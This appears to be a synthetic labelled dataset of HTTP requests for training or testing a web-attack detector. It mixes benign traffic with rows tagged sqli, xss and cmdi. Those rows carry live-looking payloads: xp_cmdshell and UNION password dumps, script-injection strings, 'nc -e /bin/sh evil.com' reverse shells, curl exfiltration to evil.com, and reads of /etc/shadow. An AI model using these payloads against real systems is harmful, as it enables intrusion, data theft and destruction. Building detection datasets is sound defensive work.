method,url,headers,body,label
PUT,"/login?lang=en&format=json&search=| perl -e 'system(""id"")'","{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""application/json"", ""content-type"": ""application/json""}","{""email"": ""villa"", ""username"": ""tutorial"", ""title"": ""journal""}",cmdi
GET,/api/apps/36763/deploy?format=csv&sort=relevance&min=curl your hair overnight,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""text/html,application/xhtml+xml"", ""referer"": ""https://example.com/products/66093/reviews""}",,benign
DELETE,/api/apps/64793/deploy?brand=lenovo&sort=rating&max=39148&q=food,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""*/*""}",,benign
GET,/blog/2024/jacket-keyboard?offset=29&lang=ja&min=3160&q=food,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""text/html,application/xhtml+xml""}",,benign
GET,/apps/app-32785/dashboard?lang=en,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""application/json"", ""referer"": ""https://example.com/products/23124/reviews""}",,benign
POST,/products/62963/reviews?min=1797&filter=house&sort=rating&ref=search,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""x-forwarded-for"": ""10.239.129.166""}","{""description"": ""ansible"", ""price"": ""447"", ""title"": ""dress"", ""username"": ""linux""}",benign
GET,/apps/app-96381/dashboard?limit=84&filter=project,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""application/json"", ""referer"": ""https://example.com/admin/settings/security""}",,benign
DELETE,/api/v2/orders/6643/items?page=15&brand=group by category&format=json,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""*/*"", ""referer"": ""https://example.com/api/apps/86950/deploy""}",,benign
GET,/docs/keyboard-electronics?min=3351&input=1%3B%20EXEC%20xp_cmdshell%28%27dir%27%29--,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""text/html,application/xhtml+xml"", ""referer"": ""https://example.com/products/88374/reviews"", ""x-forwarded-for"": ""10.105.229.236""}",,sqli
DELETE,/apps/45645?offset=sleep 8 hours daily&sort=relevance&lang=fr,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""*/*"", ""referer"": ""https://example.com/products/98010/reviews""}",,benign
POST,/apps/82831?ref=social&q=juice&input=1; SELECT * FROM information_schema.tables--,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""*/*"", ""content-type"": ""application/json"", ""x-forwarded-for"": ""10.86.128.53""}","{""value"": ""textbook"", ""title"": ""juice""}",sqli
DELETE,/checkout/cart?max=71751&id=%3B%20curl%20http%3A%2F%2Fevil.com%2F%24%28whoami%29,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""text/html,application/xhtml+xml""}",,cmdi
PUT,/apps/51679?limit=77,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""*/*"", ""content-type"": ""application/json""}","{""comment"": ""biography"", ""description"": ""pizza"", ""value"": ""eval('alert(1)')"", ""name"": ""novel""}",xss
POST,/apps/app-77437/dashboard?id=%3Cobject%20data%3Djavascript%3Aalert%281%29%3E,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/apps/app-17915/dashboard""}","{""email"": ""food"", ""category"": ""terraform"", ""quantity"": ""488"", ""name"": ""keyboard""}",xss
GET,/products/79279/reviews?q=whiskas&brand=purina&id=%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""*/*""}",,xss
GET,/dashboard/apps/62184/metrics?q=flat&brand=acer&sort=newest&max=67435,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""text/html,application/xhtml+xml"", ""referer"": ""https://example.com/checkout/cart"", ""x-forwarded-for"": ""10.96.150.68""}",,benign
PUT,/login?format=csv&max=exec chef meal prep service,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""*/*"", ""content-type"": ""application/json""}","{""description"": ""whiskas"", ""quantity"": ""21"", ""username"": ""flat"", ""category"": ""docker""}",benign
POST,/products/38952/reviews?filter=watch&sort=price_desc&q=1%27%20AND%20SLEEP%285%29--,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""application/json"", ""content-type"": ""application/json""}","{""title"": ""food"", ""quantity"": ""107"", ""price"": ""210"", ""name"": ""diner"", ""description"": ""docker""}",sqli
GET,/login?ref=social,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""text/html,application/xhtml+xml"", ""x-forwarded-for"": ""10.218.125.101""}",,benign
GET,/items/91141?filter=resume&offset=30&ref=homepage&lang=ja,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""text/html,application/xhtml+xml"", ""referer"": ""https://example.com/register""}",,benign
DELETE,/api/apps/96330/deploy?min=2225&filter=headphones&offset=56,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""text/html,application/xhtml+xml""}",,benign
GET,/account/preferences?limit=use `code` blocks in markdown&sort=price_asc,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""application/json""}",,benign
GET,/apps/15514/api/v1/items,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""application/json"", ""x-forwarded-for"": ""10.231.40.218""}",,benign
DELETE,/apps/78986/api/v1/items?page=31&max=14685,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""text/html,application/xhtml+xml""}",,benign
DELETE,/login?search=1; EXEC xp_cmdshell('dir')--,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""*/*"", ""referer"": ""https://example.com/account/preferences""}",,sqli
POST,/api/v1/users/76574/profile?ref=exec%20chef%20meal%20prep%20service,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json""}","{""username"": ""biography"", ""price"": ""393"", ""value"": ""magazine"", ""name"": ""java""}",benign
DELETE,/checkout/cart?min=3578&filter=flat&limit=eval your options before buying&sort=relevance,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""text/html,application/xhtml+xml""}",,benign
DELETE,/api/apps/54923/deploy?ref=homepage&max=87974,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""application/json"", ""x-forwarded-for"": ""10.166.173.225""}",,benign
DELETE,/checkout/cart?category=how to drop table weight effectively,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""application/json"", ""referer"": ""https://example.com/register""}",,benign
PUT,/blog/2025/diner-apartment-magazine?brand=acer&search=127.0.0.1 & nc -e /bin/sh evil.com 4444,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""*/*"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/checkout/cart""}","{""price"": ""136"", ""category"": ""smoothie"", ""title"": ""burger"", ""email"": ""java""}",cmdi
POST,/categories/clothing/products?min=4901&id=$(cat /etc/hosts),"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""application/json"", ""content-type"": ""application/json""}","{""value"": ""flat"", ""name"": ""java"", ""category"": ""apartment"", ""email"": ""tea"", ""title"": ""burger""}",cmdi
POST,/apps/88829?category=sports&lang=fr&input=1%3B%20EXEC%20xp_cmdshell%28%27dir%27%29--,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""*/*"", ""content-type"": ""application/json""}","{""description"": ""burger"", ""name"": ""guide"", ""price"": ""69"", ""title"": ""tutorial""}",sqli
PUT,/login?format=csv&limit=price > 100 & < 500,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""*/*"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/admin/settings/security""}","{""price"": ""317"", ""description"": ""textbook"", ""name"": ""diner""}",benign
GET,/docs/shoes-resume?input=%27%20OR%201%3D1%20LIMIT%201--,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""text/html,application/xhtml+xml"", ""x-forwarded-for"": ""10.179.102.180""}",,sqli
DELETE,/account/preferences?offset=426&q=1' WAITFOR DELAY '0:0:5'--,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""application/json""}",,sqli
PUT,/apps/54684/api/v1/items?offset=117&sort=newest,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""application/json"", ""content-type"": ""application/json""}","{""title"": ""trousers"", ""price"": ""335"", ""name"": ""whiskas""}",benign
DELETE,/admin/settings/security?max=23364&limit=44&page=50&category=clothing,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""text/html,application/xhtml+xml"", ""referer"": ""https://example.com/items/92543""}",,benign
DELETE,/apps/app-34248/dashboard?page=19&format=csv,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""application/json""}",,benign
PUT,/apps/42045?ref=homepage,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""application/json"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/api/v1/users/69292/profile""}","{""search"": ""<script>alert(1)</script>"", ""value"": ""keyboard"", ""description"": ""guide"", ""comment"": ""dog""}",xss
DELETE,/search,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""*/*""}",,benign
PUT,/categories/sports/products?sort=popularity&filter=ubuntu&ref=social,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/dashboard/apps/26295/metrics""}","{""value"": ""journal"", ""email"": ""book"", ""description"": ""ring"", ""category"": ""tutorial"", ""title"": ""smoothie""}",benign
GET,/blog/2022/burger-flat-studio?limit=id verification process,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""application/json""}",,benign
GET,/categories/toys/products?sort=rating&max=89075&category=food&search=1; EXEC xp_cmdshell('dir')--,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""*/*""}",,sqli
PUT,/apps/13946/api/v1/items?sort=popularity&ref=email&filter=flat&q=' OR 'a'='a,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json""}","{""quantity"": ""85"", ""description"": ""trousers"", ""email"": ""golang"", ""name"": ""burger"", ""price"": ""100""}",sqli
PUT,/blog/2026/linux-ring-shoes?max=97841,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""*/*"", ""content-type"": ""application/json""}","{""quantity"": ""232"", ""email"": ""golang"", ""value"": ""rust"", ""name"": ""tutorial""}",benign
POST,/api/v1/users/8096/profile?q=id%20verification%20process,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""application/json"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/docs/flat-java""}","{""email"": ""tea"", ""name"": ""camera"", ""username"": ""cat"", ""title"": ""diner"", ""value"": ""tea""}",benign
PUT,/checkout/cart?ref=search&brand=lg,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""*/*"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/search""}","{""title"": ""trousers"", ""value"": ""whiskas"", ""category"": ""juice"", ""name"": ""docker"", ""username"": ""book""}",benign
GET,/items/18040?brand=sony&max=99392,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""application/json"", ""referer"": ""https://example.com/apps/app-21287/dashboard""}",,benign
GET,"/account/preferences?category=toys&id=; python3 -c 'import socket,subprocess;s=socket.socket()'","{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""*/*""}",,cmdi
GET,/products/36955/reviews?category=curl your hair overnight&brand=dell,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""text/html,application/xhtml+xml"", ""referer"": ""https://example.com/apps/app-56654/dashboard"", ""x-forwarded-for"": ""10.154.94.43""}",,benign
PUT,/admin/settings/security?brand=sony,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/admin/settings/security"", ""x-forwarded-for"": ""10.195.246.28""}","{""comment"": ""<input autofocus onfocus=alert(1)>"", ""description"": ""salad""}",xss
PUT,/categories/sports/products?page=21&format=csv,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/categories/books/products""}","{""category"": ""headphones"", ""price"": ""131""}",benign
POST,/docs/pizza-obrien-biography?brand=philips&format=xml,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""*/*"", ""content-type"": ""application/json""}","{""quantity"": ""304"", ""value"": ""python"", ""category"": ""watch"", ""title"": ""guide""}",benign
POST,/products/49783/reviews?lang=ja,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""application/json"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/items/73170""}","{""name"": ""tutorial"", ""price"": ""248"", ""description"": ""ansible""}",benign
GET,/admin/settings/security?category=books,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""text/html,application/xhtml+xml"", ""x-forwarded-for"": ""10.152.198.209""}",,benign
POST,/apps/app-98004/dashboard,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""*/*"", ""content-type"": ""application/json""}","{""username"": ""journal"", ""price"": ""357"", ""value"": ""cat"", ""quantity"": ""86""}",benign
PUT,/dashboard/apps/47306/metrics,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json""}","{""comment"": ""camera"", ""search"": ""; rm -rf /tmp/test"", ""description"": ""cat""}",cmdi
PUT,/register?lang=es&page=50,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json""}","{""value"": ""journal"", ""price"": ""410"", ""name"": ""java"", ""quantity"": ""143""}",benign
POST,/register?max=31042,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""*/*"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/api/apps/72593/deploy""}","{""value"": ""laptop"", ""email"": ""jacket""}",benign
POST,/search?ref=homepage,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/api/v1/users/63309/profile""}","{""category"": ""camera"", ""email"": ""kubernetes""}",benign
DELETE,/login?format=csv,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""text/html,application/xhtml+xml"", ""referer"": ""https://example.com/checkout/cart""}",,benign
POST,/api/v2/orders/67117/items,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""application/json"", ""content-type"": ""application/json"", ""x-forwarded-for"": ""10.9.59.75""}","{""name"": ""jacket"", ""search"": ""monitor"", ""description"": ""0x31272f2a"", ""value"": ""resume""}",sqli
GET,/api/v1/users/47838/profile?q=shirt&brand=dell&lang=en&min=4490,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""text/html,application/xhtml+xml"", ""referer"": ""https://example.com/checkout/cart""}",,benign
PUT,/products/75699/reviews?offset=382&filter=obrien&input=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/apps/app-10316/dashboard""}","{""category"": ""resume"", ""username"": ""pizza""}",xss
POST,/products/27795/reviews?category=toys&q=%27%20OR%201%3D1%3B%20DROP%20TABLE%20users--,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""*/*"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/apps/34383/api/v1/items""}","{""name"": ""book"", ""price"": ""136"", ""email"": ""diner""}",sqli
PUT,/docs/keyboard-magazine-obrien-textbook?sort=price_asc&filter=camera&limit=69&lang=es,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json""}","{""username"": ""bag"", ""quantity"": ""496"", ""price"": ""312"", ""value"": ""shoes""}",benign
POST,/categories/furniture/products?format=json&offset=499&brand=lenovo,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""application/json"", ""content-type"": ""application/json""}","{""name"": ""jacket"", ""search"": ""dress"", ""comment"": ""` cat /etc/shadow `""}",cmdi
PUT,/account/preferences,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""x-forwarded-for"": ""10.134.21.94""}","{""quantity"": ""479"", ""value"": ""typescript"", ""price"": ""309"", ""description"": ""jacket"", ""category"": ""ring""}",benign
POST,/api/v2/orders/25628/items?format=xml,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/account/preferences""}","{""value"": ""watch"", ""email"": ""shirt""}",benign
PUT,/account/preferences?limit=87&brand=dell,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/admin/settings/security""}","{""price"": ""238"", ""value"": ""magazine""}",benign
PUT,/api/v1/users/85728/profile?filter=food&offset=52&page=22&q=guide,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""application/json"", ""content-type"": ""application/json""}","{""value"": ""terraform"", ""quantity"": ""267""}",benign
PUT,/apps/32617/api/v1/items?q=resume&brand=dell&sort=relevance,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""application/json"", ""content-type"": ""application/json""}","{""description"": ""food"", ""value"": ""studio"", ""comment"": ""tea"", ""search"": ""1/**/UNION/**/SELECT/**/password/**/FROM/**/users""}",sqli
DELETE,/dashboard/apps/28116/metrics?limit=74&max=94411&input=127.0.0.1 & nc -e /bin/sh evil.com 4444,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""application/json""}",,cmdi
POST,/admin/settings/security?max=78329&format=json&filter=trousers&input=<meta http-equiv=refresh content='0;url=javascript:alert(1)'>,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""application/json"", ""content-type"": ""application/json""}","{""name"": ""house"", ""price"": ""95""}",xss
GET,/blog/2026/journal-golang-burger?ref=search,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""application/json"", ""referer"": ""https://example.com/account/preferences""}",,benign
PUT,/api/v1/users/7080/profile?brand=dell,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""*/*"", ""content-type"": ""application/json""}","{""title"": ""biography"", ""value"": ""whiskas""}",benign
DELETE,/apps/92665/api/v1/items?filter=headphones&sort=price_asc,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""*/*""}",,benign
PUT,/docs/ansible-whiskas-dress?brand=lenovo,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json""}","{""category"": ""project"", ""quantity"": ""482"", ""title"": ""magazine"", ""price"": ""299""}",benign
GET,/docs/villa-portfolio,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""*/*"", ""x-forwarded-for"": ""10.172.53.97""}",,benign
PUT,/products/85670/reviews,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""application/json"", ""content-type"": ""application/json""}","{""title"": ""biography"", ""category"": ""golang"", ""quantity"": ""272""}",benign
POST,/docs/portfolio-whiskas-monitor?page=31&ref=homepage&format=csv&search=1/**/UNION/**/SELECT/**/password/**/FROM/**/users,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""application/json"", ""content-type"": ""application/json""}","{""category"": ""kubernetes"", ""quantity"": ""203"", ""name"": ""textbook"", ""value"": ""cat""}",sqli
PUT,/api/v1/users/46939/profile?offset=358&lang=de,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""*/*"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/checkout/cart""}","{""username"": ""guide"", ""description"": ""watch"", ""price"": ""223"", ""value"": ""headphones""}",benign
GET,/search?brand=purina,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""text/html,application/xhtml+xml""}",,benign
POST,/api/v1/users/98171/profile?id=%3Cinput%20autofocus%20onfocus%3Dalert%281%29%3E,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""application/json"", ""content-type"": ""application/json""}","{""username"": ""dress"", ""category"": ""resume""}",xss
GET,/checkout/cart?filter=java&brand=sony,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""*/*""}",,benign
PUT,/api/v1/users/71320/profile?category=furniture,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/apps/43988""}","{""value"": ""cafe"", ""quantity"": ""184"", ""description"": ""monitor""}",benign
PUT,/admin/settings/security?page=19,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""*/*"", ""content-type"": ""application/json"", ""x-forwarded-for"": ""10.45.171.27""}","{""category"": ""obrien"", ""name"": ""resume"", ""username"": ""camera"", ""title"": ""java"", ""description"": ""apartment""}",benign
DELETE,/dashboard/apps/47693/metrics?lang=fr&filter=guide,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""application/json"", ""x-forwarded-for"": ""10.124.139.18""}",,benign
POST,/api/v2/orders/73900/items?limit=71&input=; curl http://evil.com/$(whoami),"{""user-agent"": ""; curl http://evil.com/$(whoami)"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json""}","{""category"": ""house"", ""username"": ""ansible"", ""description"": ""golang""}",cmdi
POST,/docs/coffee-diner?brand=lg,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""application/json"", ""content-type"": ""application/json"", ""x-forwarded-for"": ""10.191.90.201""}","{""title"": ""tutorial"", ""description"": ""salad""}",benign
PUT,/register?q=house&max=78546,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""x-forwarded-for"": ""10.98.28.37""}","{""comment"": ""<object data=javascript:alert(1)>"", ""name"": ""terraform""}",xss
PUT,/apps/34360?offset=125&filter=electronics,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json""}","{""category"": ""headphones"", ""email"": ""journal"", ""description"": ""flat"", ""username"": ""textbook""}",benign
PUT,/apps/app-52585/dashboard?q=obrien&lang=de,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""*/*"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/items/9534""}","{""title"": ""resume"", ""description"": ""trousers"", ""username"": ""ubuntu"", ""name"": ""kubernetes""}",benign
PUT,/checkout/cart?format=xml&filter=tea,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json""}","{""price"": ""173"", ""name"": ""apartment"", ""username"": ""pizza"", ""value"": ""camera"", ""category"": ""shirt""}",benign
POST,/login?format=alert%20me%20when%20stock%20arrives&max=55358&brand=apple,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""*/*"", ""content-type"": ""application/json""}","{""description"": ""cat"", ""quantity"": ""131"", ""price"": ""72"", ""value"": ""docker""}",benign
POST,/apps/app-72809/dashboard?format=csv,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""x-forwarded-for"": ""10.51.181.49""}","{""description"": ""cafe"", ""email"": ""laptop""}",benign
POST,/api/v1/users/82732/profile?category=electronics&max=13084&lang=fr&limit=100,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""application/json"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/api/v1/users/11260/profile""}","{""username"": ""trousers"", ""value"": ""apartment"", ""email"": ""shoes"", ""category"": ""ubuntu"", ""description"": ""pizza""}",benign
DELETE,/items/65516?page=49&lang=fr,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""application/json""}",,benign
POST,/admin/settings/security?search=%3Cinput%20autofocus%20onfocus%3Dalert%281%29%3E,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/login""}","{""title"": ""python"", ""price"": ""79""}",xss
GET,/dashboard/apps/57444/metrics?category=sports,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""text/html,application/xhtml+xml"", ""x-forwarded-for"": ""10.31.71.68""}",,benign
GET,/api/apps/21338/deploy?ref=how%20to%20drop%20table%20weight%20effectively&format=json,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""*/*"", ""referer"": ""https://example.com/blog/2022/camera-java-bag-pizza""}",,benign
PUT,/account/preferences?category=sports&q=javascript,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""application/json"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/apps/15107""}","{""value"": ""dress"", ""price"": ""145"", ""description"": ""juice"", ""category"": ""howto"", ""name"": ""house""}",benign
DELETE,/api/v2/orders/90376/items?offset=300&page=40,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""*/*""}",,benign
